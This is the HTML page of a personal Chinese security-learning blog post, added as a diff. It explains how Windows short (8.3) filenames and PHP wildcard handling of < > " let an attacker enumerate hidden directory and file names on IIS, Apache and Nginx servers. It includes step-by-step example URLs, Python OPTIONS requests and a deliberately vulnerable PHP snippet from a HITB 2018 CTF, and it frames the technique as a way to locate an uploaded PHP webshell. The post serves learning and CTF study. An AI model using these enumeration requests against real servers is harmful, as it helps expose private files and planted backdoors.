@@ -1,0 +1,798 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=6.6.0" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.6.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.6.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.6.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.6.0" color="#222">
+
+
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '6.6.0',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="参考文献：https://xz.aliyun.com/t/2318                  https://www.jianshu.com/p/96cf08d569bcWinAPI与通配符在Windows环境下使用PHP时，PHP中的部分函数会调用2个底层Windows API函数FindFirstFileExW()，FindFirstFile() 这两个函数对&amp;lt; &amp;gt; &amp;qu">
+<meta property="og:type" content="website">
+<meta property="og:title" content="cws6">
+<meta property="og:url" content="https://cws6.github.io/user-5035860-1543717448/漏洞学习/window的特性.html">
+<meta property="og:site_name" content="cws6">
+<meta property="og:description" content="参考文献：https://xz.aliyun.com/t/2318                  https://www.jianshu.com/p/96cf08d569bcWinAPI与通配符在Windows环境下使用PHP时，PHP中的部分函数会调用2个底层Windows API函数FindFirstFileExW()，FindFirstFile() 这两个函数对&amp;lt; &amp;gt; &amp;qu">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2018-12-02T02:24:08.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="cws6">
+<meta name="twitter:description" content="参考文献：https://xz.aliyun.com/t/2318                  https://www.jianshu.com/p/96cf08d569bcWinAPI与通配符在Windows环境下使用PHP时，PHP中的部分函数会调用2个底层Windows API函数FindFirstFileExW()，FindFirstFile() 这两个函数对&amp;lt; &amp;gt; &amp;qu">
+
+
+
+
+
+
+  <link rel="canonical" href="https://cws6.github.io/user-5035860-1543717448/漏洞学习/window的特性.html">
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title> | cws6</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+    <a href="https://github.com/cws6"><img style="position: absolute; top: 0; right: 0; border: 0;" src="https://s3.amazonaws.com/github/ribbons/forkme_right_darkblue_121621.png" alt="Fork me on GitHub"></a>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">cws6</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+      
+        <p class="site-subtitle">空巢老人</p>
+      
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Home</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>Tags</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archives</a>
+
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+    
+
+    
+    
+      
+      
+    
+      
+      
+    
+      
+      
+    
+    
+
+  
+
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+    
+    
+    <div class="post-block page">
+      <header class="post-header">
+
+<h1 class="post-title" itemprop="name headline"></h1>
+
+<div class="post-meta">
+  
+  
+
+
+  
+  
+  <ul class="breadcrumb">
+    
+      
+      
+        
+          <li><a href="/user-5035860-1543717448/">USER-5035860-1543717448</a></li>
+          
+            
+          
+        
+      
+    
+      
+      
+        
+          <li>漏洞学习</li>
+        
+      
+    
+      
+      
+        
+          <li><a href="/user-5035860-1543717448/window的特性.html/">WINDOW的特性.HTML</a></li>
+          
+            
+          
+        
+      
+    
+  </ul>
+
+
+</div>
+
+</header>
+
+      
+      
+      
+      <div class="post-body">
+        
+        
+          <p>参考文献：<a href="https://xz.aliyun.com/t/2318" target="_blank" rel="noopener">https://xz.aliyun.com/t/2318</a><br>                  <a href="https://www.jianshu.com/p/96cf08d569bc" target="_blank" rel="noopener">https://www.jianshu.com/p/96cf08d569bc</a><br><strong>WinAPI与通配符</strong><br>在Windows环境下使用PHP时，PHP中的部分函数会调用2个底层Windows API函数<code>FindFirstFileExW()</code>，<code>FindFirstFile()</code></p>
+<p>这两个函数对<code>&lt; &gt; &quot;</code>三个字符做了特别的对待和处理:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">大于号 &gt; 等价于 通配符 ？ 0次或1次</span><br><span class="line"></span><br><span class="line">小于号 &lt; 等价于 通配符 * 0次或多次</span><br><span class="line"></span><br><span class="line">双引号 &quot; 等价于 通配符 . 匹配除换行符(\n, \r)之外的任意单个字符</span><br></pre></td></tr></table></figure></p>
+<p>也就是说，在Windows下的PHP的某些函数中，我们可以使用<code>&lt; &gt; &quot;</code>来匹配一些文件名/目录名，将文件名不可知部分之后的字符用”&lt;”，”&gt;”代替，只用一个”&lt;”或”&gt;”只能代表一个字符，若文件名很长需要用”&lt;&lt;”才行。</p>
+<p>这里的部分函数包括但不限于:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">include()                       包含文件</span><br><span class="line">include_once()                  包含文件</span><br><span class="line">require()                       包含文件</span><br><span class="line">require_once()                  包含文件</span><br><span class="line">fopen()                         打开文件</span><br><span class="line">copy()                          复制文件</span><br><span class="line">file_get_contents()             读取文件</span><br><span class="line">readfile()                      读取文件</span><br><span class="line">file_put_contents()             写入文件</span><br><span class="line">mkdir()                         创建文件</span><br><span class="line">opendir()                       文件夹操作</span><br><span class="line">readdir()                       文件夹操作</span><br><span class="line">move_uploaded_file()            移动文件</span><br><span class="line">getimagesize()                  获取图像尺寸，类型等信息</span><br><span class="line">......</span><br></pre></td></tr></table></figure></p>
+<p><strong>IIS短文件名</strong><br>远古时代的DOS下存在这样的文件命名规则:<br><code>主文件名不能超过8个字符，扩展名不能超过3个字符(也被叫为8.3格式。)</code><br>Windows为了兼容MS-DOS，为文件名超过8位，扩展名超过3位的文件都会对应地创建一个8.3格式的文件名，也称为短文件名。在cmd下使用命令 <code>dir /x</code>可以查看文件对应的短文件名<br><em>短文件名有如下2个特征:</em></p>
+<ul>
+<li>文件名只显示前6个字符，后续字符用~1代替。当存在多个文件名类似的文件时(文件名前6位相同，且后缀名前3位相同)，数字1会进行递增。</li>
+<li>后缀只显示前3个字符。</li>
+</ul>
+<p><strong>Windows + IIS 6 + .net 文件/目录猜测</strong><br>适用条件与局限:</p>
+<ul>
+<li>被猜测文件的文件名长度需超过8位，或后缀名超过3位。</li>
+<li>环境为Windows + IIS + .net</li>
+<li>只能猜测出文件名的前6位，后缀名的前3位。</li>
+</ul>
+<p><em>IIS短文件名漏洞</em></p>
+<p>当我们访问某个存在的短文件名时，会返回404。而当我们访问某个不存在的短文件名时，会返回400，依据返回结果的不同，就可以进行逐位猜测了。</p>
+<p>比如要猜测出如下文件<code>abc7758521woaini.aspx</code></p>
+<ul>
+<li>猜测文件名/目录名<br>进行如下猜解，不断向下猜解完所有的6个字符，<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">http://xxx.xx.xx.xxx/a*~1****/xxx.aspx   返回404  猜测正确</span><br><span class="line">http://xxx.xx.xx.xxx/aa*~1****/xxx.aspx  Bad Request 猜测错误</span><br><span class="line">http://xxx.xx.xx.xxx/ab*~1****/xxx.aspx  返回404</span><br><span class="line">http://xxx.xx.xx.xxx/abc*~1****/xxx.aspx 返回404</span><br><span class="line">......</span><br><span class="line">http://xxx.xx.xx.xxx/abc774*~1****/xxx.aspx  Bad Request</span><br><span class="line">http://xxx.xx.xx.xxx/abc775*~1****/xxx.aspx  返回404</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>到了这一步，我们要来判断这是一个目录还是一个文件。<br>若如下请求返回404，则代表它是一个目录，否则就是一个文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">* 猜测文件后缀</span><br><span class="line">接下来开始猜解文件后缀，不断向下猜解完所有的3个字符</span><br></pre></td></tr></table></figure></p>
+<p><a href="http://xxx.xx.xx.xxx/abc775*~1*a**/xxx.aspx" target="_blank" rel="noopener">http://xxx.xx.xx.xxx/abc775*~1*a**/xxx.aspx</a><br><a href="http://xxx.xx.xx.xxx/abc775*~1*as*/xxx.aspx" target="_blank" rel="noopener">http://xxx.xx.xx.xxx/abc775*~1*as*/xxx.aspx</a><br><a href="http://xxx.xx.xx.xxx/abc775*~1*asp/xxx.aspx" target="_blank" rel="noopener">http://xxx.xx.xx.xxx/abc775*~1*asp/xxx.aspx</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">返回`无法找到该页面`，则猜测成功</span><br><span class="line"></span><br><span class="line">**Windows + IIS 7.x + .net 文件/目录猜测**</span><br><span class="line">不同版本的IIS返回结果如下:</span><br></pre></td></tr></table></figure></p>
+<p>IIS 6                          /valid<em>~1</em>/.aspx           HTTP 404 -File not found<br>IIS 6                          /Invalid<em>~1</em>/.aspx         HTTP 400 -Bad Request<br>IIS 5.x                        /valid<em>~1</em>                 HTTP 404 -File not found<br>IIS 5.x                        /Invalid<em>~1</em>               HTTP 400 -Bad Request<br>IIS 7.x.Net.2                                             Page contains:<br>No Error Handling              /valid<em>~1</em>/               “Error code 0x 00000000 “<br>IIS 7.x.Net.2                                             Page contains:<br>No Error Handling              /Invalid<em>~1</em>/             “Error code 0x 80070002 “<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">给出了IIS 7.x开启了详细错误之后，不同页面的变化情况，然而默认情况下都是显示一个自定义的404页面，并不会给出详细错误。</span><br><span class="line"></span><br><span class="line">猜测出根目录下的一个目录名:`abcdefg1234567aaabbb`</span><br><span class="line">在默认情况下，无论该文件/目录是否存在，都会返回一个404，返回结果没有差异的话，就无法猜测。</span><br></pre></td></tr></table></figure></p>
+<p><a href="http://xxx.xx.xx.xxx/a*~1****/xxx.aspx" target="_blank" rel="noopener">http://xxx.xx.xx.xxx/a*~1****/xxx.aspx</a><br><a href="http://xxx.xx.xx.xxx/b*~1****/xxx.aspx" target="_blank" rel="noopener">http://xxx.xx.xx.xxx/b*~1****/xxx.aspx</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">使用`OPTIONS`方式请求，可以得到不一样的返回结果:</span><br></pre></td></tr></table></figure></p>
+<blockquote>
+<blockquote>
+<blockquote>
+<p>a= requests.options(“<a href="http://xxx.xx.xx.xxx/abcdee*~1.*/.aspx&quot;" target="_blank" rel="noopener">http://xxx.xx.xx.xxx/abcdee*~1.*/.aspx&quot;</a>)<br>a<br>a= requests.options(“<a href="http://xxx.xx.xx.xxx/abcdef*~1.*/.aspx&quot;" target="_blank" rel="noopener">http://xxx.xx.xx.xxx/abcdef*~1.*/.aspx&quot;</a>)<br>a<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">存在时会返回404，不存在时会返回200，根据返回结果的差异，就可以探测出目录名的短文件名。</span><br><span class="line"></span><br><span class="line">当主动开启了详细错误之后，使用GET请求也可以得到有差异的结果了。</span><br></pre></td></tr></table></figure></p>
+</blockquote>
+</blockquote>
+</blockquote>
+<p>若存在 <a href="http://xxx.xx.xx.xxx/a*~1****/xxx.aspx" target="_blank" rel="noopener">http://xxx.xx.xx.xxx/a*~1****/xxx.aspx</a>          错误代码为 0x00000000<br>若不存在<a href="http://xxx.xx.xx.xxx/b*~1****/xxx.aspx" target="_blank" rel="noopener">http://xxx.xx.xx.xxx/b*~1****/xxx.aspx</a>       错误代码为 0x80070002<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">**Windows + Apache + PHP 文件/目录猜测**</span><br><span class="line"></span><br><span class="line">在该环境下，无法像在IIS下直接用URL访问的方式去逐位猜测短文件名了，但有两个杀伤力更大的特性:</span><br><span class="line">* 当Web程序中存在某些函数时(前置知识中提到的)，我们借助它们来逐位猜测出完整目录名，文件名，并且没有长度大小的限制。</span><br><span class="line">* 虽然无法直接用URL访问的方式去逐位猜测出`短文件名`，但是可以用URL访问的方式直接*访问/下载 已知短文件名的目录/文件*</span><br><span class="line"></span><br><span class="line">*   特性1</span><br><span class="line"></span><br><span class="line">这里以HITB 2018的一道CTF题目为例，示例代码如下:</span><br></pre></td></tr></table></figure></p>
+<p>&lt;?php </p>
+<p>$filename = $_GET[‘filename’];</p>
+<p>$file = “./abcdefg1234567aaabb/“ . $filename;</p>
+<p>var_dump(getimagesize($file));</p>
+<p>?&gt;<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">网站存在上传功能，我们将一个php木马上传到了某目录下(abcdefg1234567aaabb)，但是不知道其目录名。</span><br><span class="line">但是，我们可以向1.php的filename参数传入该目录下的一个图片名，程序会返回该图片的尺寸信息。</span><br><span class="line">执行如下访问</span><br></pre></td></tr></table></figure></p>
+<p><a href="http://xxx.xx.xx.xxx/1.php?filename=../a" target="_blank" rel="noopener">http://xxx.xx.xx.xxx/1.php?filename=../a</a>&lt;/01.png                 返回正常<br><a href="http://xxx.xx.xx.xxx/1.php?filename=../aa" target="_blank" rel="noopener">http://xxx.xx.xx.xxx/1.php?filename=../aa</a>&lt;/01.png                 返回错误<br><a href="http://xxx.xx.xx.xxx/1.php?filename=../ab" target="_blank" rel="noopener">http://xxx.xx.xx.xxx/1.php?filename=../ab</a>&lt;/01.png                  返回正常<br>……<br><a href="http://xxx.xx.xx.xxx/1.php?filename=../abcdefg" target="_blank" rel="noopener">http://xxx.xx.xx.xxx/1.php?filename=../abcdefg</a>&lt;/01.png             返回正常<br>……<br><a href="http://xxx.xx.xx.xxx/1.php?filename=../abcdefg1234" target="_blank" rel="noopener">http://xxx.xx.xx.xxx/1.php?filename=../abcdefg1234</a>&lt;/01.png         返回正常<br>……<br><a href="http://xxx.xx.xx.xxx/1.php?filename=../abcdefg1234567aaabb" target="_blank" rel="noopener">http://xxx.xx.xx.xxx/1.php?filename=../abcdefg1234567aaabb</a>&lt;/01.png  返回正常<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">接下来的26 + 10 次尝试中，均返回错误，证明我们已经将目录名猜解完毕，得到目录名:</span><br></pre></td></tr></table></figure></p>
+<p>abcdefg1234567aaabb<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">假设我们连php木马名也不知道呢?猜解文件名也是同一个道理</span><br></pre></td></tr></table></figure></p>
+<p><a href="http://xxx.xx.xx.xxx/1.php?filename=../abcdefg1234567aaabb/w" target="_blank" rel="noopener">http://xxx.xx.xx.xxx/1.php?filename=../abcdefg1234567aaabb/w</a>&lt;.php</p>
+<p><a href="http://xxx.xx.xx.xxx/1.php?filename=../abcdefg1234567aaabb/wo" target="_blank" rel="noopener">http://xxx.xx.xx.xxx/1.php?filename=../abcdefg1234567aaabb/wo</a>&lt;.php</p>
+<p><a href="http://xxx.xx.xx.xxx/1.php?filename=../abcdefg1234567aaabb/woa" target="_blank" rel="noopener">http://xxx.xx.xx.xxx/1.php?filename=../abcdefg1234567aaabb/woa</a>&lt;.php</p>
+<p><a href="http://xxx.xx.xx.xxx/1.php?filename=../abcdefg1234567aaabb/woai" target="_blank" rel="noopener">http://xxx.xx.xx.xxx/1.php?filename=../abcdefg1234567aaabb/woai</a>&lt;.php</p>
+<p>……</p>
+<p><a href="http://xxx.xx.xx.xxx/1.php?filename=../abcdefg1234567aaabb/woainihhhh" target="_blank" rel="noopener">http://xxx.xx.xx.xxx/1.php?filename=../abcdefg1234567aaabb/woainihhhh</a>&lt;.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">接下来的26 + 10 次尝试中，均返回错误，证明我们已经将文件名猜解完毕，得到文件名。将目录名和文件名拼接:</span><br></pre></td></tr></table></figure></p>
+<p><a href="http://xxx.xx.xx.xxx/abcdefg1234567aaabb/woainihhhh.php" target="_blank" rel="noopener">http://xxx.xx.xx.xxx/abcdefg1234567aaabb/woainihhhh.php</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">* 特性2</span><br><span class="line">事实上，在上一步中，并不需要猜测出完整文件名，目录名，用短文件名就可以直接访问，下载了。</span><br></pre></td></tr></table></figure></p>
+<p><a href="http://xxx.xx.xx.xxx/abcdef~1/woaini~1.php" target="_blank" rel="noopener">http://xxx.xx.xx.xxx/abcdef~1/woaini~1.php</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">想要下载如下文件</span><br></pre></td></tr></table></figure></p>
+<p><a href="http://xxx.xx.xx.xxx/uploads/abcdefgasd1241asd123sgadg123sdgasd123dzg.zip" target="_blank" rel="noopener">http://xxx.xx.xx.xxx/uploads/abcdefgasd1241asd123sgadg123sdgasd123dzg.zip</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">同样可以使用短文件名去下载</span><br></pre></td></tr></table></figure></p>
+<p><a href="http://xxx.xx.xx.xxx/uploads/abcdef~1.zip" target="_blank" rel="noopener">http://xxx.xx.xx.xxx/uploads/abcdef~1.zip</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">这种方法在IIS下无法使用，IIS不接受直接用短文件名访问的请求方式。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">**Windows + IIS + PHP 文件/目录猜测**</span><br><span class="line">在该环境下，可以用到很多前面提到的特性。</span><br><span class="line">* 可以使用URL访问的方式，来逐位猜测出目录/文件的短文件名</span><br><span class="line">* 当Web程序中存在某些函数时(前置知识中提到的)，我们借助它们来逐位猜测出完整目录名，文件名，并且没有长度大小的限制。</span><br><span class="line">* 可以使用URL访问的方式，用通配符直接访问文件(但不能访问目录)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*特性1*</span><br><span class="line">使用前面提到过的OPTIONS请求方式来逐位猜测目录的短文件名</span><br></pre></td></tr></table></figure></p>
+<blockquote>
+<blockquote>
+<blockquote>
+<p>“a= requests.options(“<a href="http://xxx.xx.xx.xxx/abcde~1/&quot;" target="_blank" rel="noopener">http://xxx.xx.xx.xxx/abcde~1/&quot;</a>)<br>a<br>“a= requests.options(“<a href="http://xxx.xx.xx.xxx/abcdf~1/&quot;" target="_blank" rel="noopener">http://xxx.xx.xx.xxx/abcdf~1/&quot;</a>)<br>a<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">*存在时返回404，不存在时返回200*</span><br><span class="line"></span><br><span class="line">*特性2*</span><br><span class="line">这是PHP的特性，与Web服务器种类无关。</span><br><span class="line">首先逐位猜测出目录名</span><br></pre></td></tr></table></figure></p>
+</blockquote>
+</blockquote>
+</blockquote>
+<p><a href="http://xxx.xx.xx.xxx/1.php?filename=../abcdefg1234567aaabbb/" target="_blank" rel="noopener">http://xxx.xx.xx.xxx/1.php?filename=../abcdefg1234567aaabbb/</a>&lt;.php<br><a href="http://xxx.xx.xx.xxx/1.php?filename=../abcdefg1234567aaabbb/woainihhhh.php" target="_blank" rel="noopener">http://xxx.xx.xx.xxx/1.php?filename=../abcdefg1234567aaabbb/woainihhhh.php</a><br><a href="http://xxx.xx.xx.xxx/abcdefg1234567aaabbb/woainihhhh.php//得到完整文件路径" target="_blank" rel="noopener">http://xxx.xx.xx.xxx/abcdefg1234567aaabbb/woainihhhh.php//得到完整文件路径</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">*特性3*</span><br><span class="line">事实上猜测出目录名就足够了，文件名可以直接使用通配符去访问:</span><br><span class="line">```http://192.168.219.241/abcdefg1234567aaabbb/w&lt;.php</span><br></pre></td></tr></table></figure></p>
+<p><strong>Windows + Nginx + PHP 文件/目录猜测</strong><br>在该环境下，依然可用使用提到的多个特性</p>
+<ul>
+<li>可以直接用短文件名，访问目录和文件</li>
+<li>可以直接用通配符访问文件，但是不能访问目录</li>
+<li>PHP某些函数的特性</li>
+</ul>
+<p><em>特性1</em><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx.xx.xx.xxx/abcdefgwoaini123/xxxaaabbbccc.php</span><br></pre></td></tr></table></figure></p>
+<p>等价于<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx.xx.xx.xxx/abcdef~1/xxxaaa~1.php</span><br></pre></td></tr></table></figure></p>
+<p><em>特性2</em><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx.xx.xx.xxx/abcdefgwoaini123/xxxaaabbbccc.php</span><br></pre></td></tr></table></figure></p>
+<p>等价于<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx.xx.xx.xxx/abcdef~1/x&lt;.php</span><br></pre></td></tr></table></figure></p>
+<p><em>特性3</em><br>逐位猜测目录名:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx.xx.xx.xxx/1.php?filename=../abcdefgwoaini123&lt;/1.php</span><br></pre></td></tr></table></figure></p>
+<p>Read error代表存在<br>逐位猜测文件名<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx.xx.xx.xxx/1.php?filename=../abcdefgwoaini123/xxxaaabbbccc&lt;.php</span><br></pre></td></tr></table></figure></p>
+<p>进而拼接处完整文件路径:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx.xx.xx.xxx/abcdefgwoaini123/xxxaaabbbccc.php</span><br></pre></td></tr></table></figure></p>
+
+        
+      </div>
+      
+      
+      
+    </div>
+    
+
+
+  
+  
+  <ul class="breadcrumb">
+    
+      
+      
+        
+          <li><a href="/user-5035860-1543717448/">USER-5035860-1543717448</a></li>
+          
+            
+          
+        
+      
+    
+      
+      
+        
+          <li>漏洞学习</li>
+        
+      
+    
+      
+      
+        
+          <li><a href="/user-5035860-1543717448/window的特性.html/">WINDOW的特性.HTML</a></li>
+          
+            
+          
+        
+      
+    
+  </ul>
+
+
+    
+    
+    
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+
+      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">cws6</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">3</span>
+                    <span class="site-state-item-name">posts</span>
+                  </a>
+                </div>
+              
+
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">3</span>
+                    <span class="site-state-item-name">tags</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </section>
+
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
